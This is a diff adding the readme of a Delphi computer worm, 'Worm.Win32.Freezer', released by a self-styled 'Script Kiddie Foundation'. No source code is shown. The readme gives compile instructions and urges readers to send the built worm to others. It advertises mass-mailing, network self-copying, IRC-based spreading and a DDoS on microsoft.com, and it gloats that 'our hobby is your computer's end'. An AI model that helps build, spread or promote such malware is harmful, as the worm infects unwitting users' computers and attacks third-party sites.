@@ -1,0 +1,54 @@
+   ################ The Script Kiddie Foundation ###############
+   ########################## presents: ########################
+   ## WORM.WIN32.FREEZER - A fresh Computer-Worm              ##
+   ## Written in Delphi by Bobfan                             ##
+   #############################################################
+   #############################################################
+   #                                                           #
+   # Hey wussup?                                               #
+   # This is Freezer, a Worm written in Delphi...              #
+   # If you wanna build up ur own this is the right package!   #
+   # Do whatever u wanna do!                                   #
+   #                                                           #
+   #  PeazZ, Bobfan                                            #
+   #                                                           #
+   #############################################################
+   ################ Instructions to compile: ###################
+   #                                                           #
+   # Instructions to compile:                                  #
+   # Open up the Delphi IDE (i prefer 6, but any other         #
+   # version like 7 or 2005 should work too)                   #
+   # Load freezer.dpr                                          #
+   # And finally compile&build it!                             #
+   # Now send this compiled file to all the kiddies out there! #
+   #                                                           #
+   #############################################################
+   ####################### Features: ###########################
+   #                                                           #
+   # Features:                                                 #
+   # Mass-Mailing                                              #
+   # Drop copies of itself into several folders                #
+   # Uses its own IRC-Bot                                      #
+   # Drop IRC-Script for spreading                             #
+   # Very fast installation and spreading time                 #
+   # Visit site (nice, its a warez-site ;-P)                   #
+   # DDoS a Homepage (microsoft.com)                           #
+   # Massive Web-Download                                      #
+   # Drop copies of itself in the network                      #
+   #############################################################
+   ######################### License ###########################
+   #                                                           #
+   # Feel free to do whatevery you want with it!               #
+   # Released by Script Kiddie Foundation                      #
+   # Project is (c) 2005 by SKF                                #
+   # "Our hobby is your computer's end" :-P                    #
+   #                                                           #
+   #############################################################
+   ########################## Thanks ###########################
+   #                                                           #
+   # Big thanks to: p0ke, Positron, Terrahawk, Naked crew,     #
+   # Read 101, Shinyo, Lucifer0000, Gandro, Amok-One, Sebi,    #
+   # Commodore-Freak, Joe, Reaper, OSBetaArchive, Winhistory   #
+   # und an viele andere!                                      #
+   #############################################################
+   ########################## Bobfan ###########################
